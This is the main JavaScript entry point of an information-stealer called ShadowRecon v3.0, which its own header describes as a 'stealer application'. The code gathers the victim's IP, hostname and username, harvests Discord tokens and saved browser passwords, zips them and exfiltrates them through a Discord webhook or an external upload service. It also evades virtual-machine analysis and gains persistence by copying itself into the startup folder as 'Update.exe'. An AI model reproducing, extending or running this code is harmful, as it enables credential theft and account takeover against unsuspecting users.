/**
 * Main Application Entry Point
 * Clean, modular, and efficient stealer application
 */

// Core imports
const { logger, ErrorHandler, fileManager, stats, CoreUtils } = require('./core');
const config = require('./config/config');

// Module imports
const { BrowserCollector } = require('./modules');

// Service imports
const { DiscordService, uploadService } = require('./services');

/**
 * Main Application Class
 * Orchestrates the entire data collection and sending workflow
 * 
 * @class Application
 * @description Handles initialization, data collection, processing, and cleanup
 */
class Application {
    /**
     * Create an Application instance
     * @constructor
     */
    constructor() {
        this.initialized = false;
        this.results = {};
        
        // Initialize services
        this.browserCollector = new BrowserCollector();
        this.discordService = new DiscordService();
        
        // Setup error handlers
        ErrorHandler.setupGlobalHandlers();
    }

    /**
     * Initialize application
     * @async
     * @function initialize
     * @description Sets up the application environment and validates configuration
     * @throws {Error} When configuration is invalid or initialization fails
     * @returns {Promise<void>}
     */
    async initialize() {
        try {
            logger.info('Initializing ShadowRecon v3.0');

            // Validate configuration
            if (!config.validate()) {
                throw new Error('Invalid configuration');
            }

            // Note: File manager initialization moved to processAndSend to avoid creating 
            // temporary folders when no Discord tokens are found

            // Collect system information
            await this.collectSystemInfo();

            // Setup persistence if enabled
            await this.setupPersistence();

            this.initialized = true;
            logger.info('Application initialized successfully');
        } catch (error) {
            ErrorHandler.handle(error);
            throw error;
        }
    }

    /**
     * Collect system information
     * @async
     * @function collectSystemInfo
     * @description Gathers system metadata including IP, hostname, and platform info
     * @returns {Promise<void>}
     */
    async collectSystemInfo() {
        try {
            const systemInfo = {
                ip: await CoreUtils.getPublicIp(),
                hostname: await CoreUtils.getHostname(),
                username: CoreUtils.getUsername(),
                platform: process.platform,
                arch: process.arch,
                nodeVersion: process.version
            };

            stats.setSystemInfo(systemInfo);
            logger.info('System information collected', systemInfo);
        } catch (error) {
            logger.error('Failed to collect system information', error.message);
        }
    }

    /**
     * Setup persistence mechanism
     * @async
     * @function setupPersistence
     * @description Configures application persistence if self-destruct is disabled
     * @returns {Promise<void>}
     */
    async setupPersistence() {
        try {
            if (!config.get('security.enableSelfDestruct', false)) {
                return;
            }

            const startupPath = config.get('paths.startup');
            const currentExe = process.argv0;
            const targetPath = require('path').join(startupPath, 'Update.exe');

            if (require('fs').existsSync(currentExe)) {
                require('fs').copyFileSync(currentExe, targetPath);
                logger.debug('Persistence setup completed', { target: targetPath });
            }
        } catch (error) {
            logger.debug('Persistence setup failed', error.message);
        }
    }

    /**
     * Run data collection modules
     * @async
     * @function collectData
     * @description Orchestrates data collection from all enabled modules
     * @returns {Promise<Object|null>} Collected data object or null if no Discord tokens found
     */
    async collectData() {
        if (!this.initialized) {
            await this.initialize();
        }

        logger.info('Starting data collection');

        const modules = config.get('modules.enabled');
        const results = {};

        // Discord data collection - check first if Discord tokens exist
        if (modules.discord) {
            try {
                logger.info('Collecting Discord data');
                results.discord = await this.discordService.collectAccounts();
                
                // Exit early if no Discord accounts found
                const discordAccounts = results.discord?.length || 0;
                if (discordAccounts === 0) {
                    logger.info('No Discord tokens found - exiting without collecting other data or creating files');
                    return null; // Return null to indicate no data should be processed
                }
                
                logger.info(`Found ${discordAccounts} Discord accounts - proceeding with data collection`);
            } catch (error) {
                ErrorHandler.handle(error);
                logger.info('Discord data collection failed - exiting without creating files');
                return null; // Return null to indicate no data should be processed
            }
        } else {
            logger.info('Discord module disabled - exiting without creating files');
            return null; // If Discord module is disabled, don't create any files
        }

        // Browser data collection - only if we have Discord tokens
        if (modules.browsers) {
            try {
                logger.info('Collecting browser data');
                results.browsers = await this.browserCollector.collect();
            } catch (error) {
                ErrorHandler.handle(error);
                results.browsers = { error: error.message };
            }
        }

        // Add other modules here as needed
        // if (modules.crypto) { ... }
        // if (modules.files) { ... }
        // if (modules.system) { ... }

        this.results = results;
        
        logger.info('Data collection completed', {
            modules: Object.keys(results),
            browserAccounts: results.browsers?.totalPasswords || 0,
            discordAccounts: results.discord?.length || 0
        });

        return results;
    }

    /**
     * Process and send collected data
     * @async
     * @function processAndSend
     * @description Creates archives and sends data via webhooks or file uploads
     * @throws {Error} When processing or sending fails
     * @returns {Promise<void>}
     */
    async processAndSend() {
        try {
            logger.info('Processing collected data');

            // Initialize file manager now that we know we have Discord tokens to process
            fileManager.init();

            // Create archive
            const zipPath = await fileManager.createZip();
            const zipSizeMB = fileManager.getZipSizeMB();

            logger.info('Archive created', {
                path: zipPath,
                size: `${zipSizeMB.toFixed(2)} MB`
            });

            // Determine if file should be uploaded
            let downloadLink = '';
            if (uploadService.shouldUpload(zipPath)) {
                logger.info('File size exceeds limit, uploading to external service');
                downloadLink = await uploadService.upload(zipPath);
            }

            // Send Discord accounts if available (more complete embed with username, etc.)
            if (this.results.discord && Array.isArray(this.results.discord) && this.results.discord.length > 0) {
                const systemInfo = stats.getRawData().system;
                await this.discordService.sendAccountEmbeds(this.results.discord, systemInfo.ip || 'Unknown');
                logger.info('Sent Discord account embeds (most complete information)');
            } else {
                // Only send main webhook if no Discord accounts are available
                await this.sendMainWebhook(downloadLink, zipPath);
                logger.info('Sent main webhook (no Discord accounts available)');
            }

            logger.info('Data processing and sending completed');
        } catch (error) {
            ErrorHandler.handle(error);
            throw error;
        }
    }

    /**
     * Send main webhook with statistics
     * @async
     * @function sendMainWebhook
     * @description Sends main webhook with system stats and optional file attachment
     * @param {string} [downloadLink=''] - Optional download link for external file uploads
     * @param {string} [zipPath=''] - Optional path to zip file for direct attachment
     * @returns {Promise<void>}
     */
    async sendMainWebhook(downloadLink = '', zipPath = '') {
        try {
            const systemInfo = stats.getRawData().system;
            const payload = stats.buildWebhookPayload(
                systemInfo.username,
                systemInfo.hostname,
                systemInfo.ip,
                downloadLink
            );

            if (downloadLink) {
                // Send with link only
                await this.discordService.sendWebhook(JSON.parse(payload));
            } else {
                // Send with file attachment
                const embed = JSON.parse(payload).embeds[0];
                await this.discordService.sendFile(zipPath, embed);
            }

            logger.info('Main webhook sent successfully');
        } catch (error) {
            logger.error('Failed to send main webhook', error.message);
        }
    }

    /**
     * Cleanup resources
     * @async
     * @function cleanup
     * @description Cleans up temporary files and resources
     * @returns {Promise<void>}
     */
    async cleanup() {
        try {
            logger.info('Cleaning up resources');

            // Clean up temporary files
            fileManager.cleanup();

            logger.info('Cleanup completed');
        } catch (error) {
            logger.error('Cleanup failed', error.message);
        }
    }

    /**
     * Run complete application workflow
     * @async
     * @function run
     * @description Executes the complete application lifecycle from initialization to cleanup
     * @returns {Promise<void>}
     */
    async run() {
        try {
            logger.info('Starting ShadowRecon v3.0');

            // Initialize application
            await this.initialize();

            // VM detection (if enabled)
            if (config.get('security.enableVmDetection')) {
                const isVm = await CoreUtils.isVirtualMachine();
                if (isVm) {
                    logger.warn('Virtual machine detected, exiting');
                    return;
                }
            }

            // Collect data
            const results = await this.collectData();
            
            // Exit early if no Discord tokens were found (results will be null)
            if (results === null) {
                logger.info('ShadowRecon completed - no Discord tokens found, no files created');
                return;
            }

            // Process and send data
            await this.processAndSend();

            logger.info('ShadowRecon completed successfully');
        } catch (error) {
            logger.error('Application failed', error.message);
            ErrorHandler.handle(error);
        } finally {
            // Always cleanup
            await this.cleanup();
        }
    }
}

/**
 * Application entry point
 * @async
 * @function main
 * @description Creates and runs the main application instance
 * @returns {Promise<void>}
 */
async function main() {
    const app = new Application();
    await app.run();
}

// Run application if this file is executed directly
if (require.main === module) {
    main().catch(error => {
        console.error('Unhandled error:', error);
        process.exit(1);
    });
}

module.exports = {
    Application,
    main
};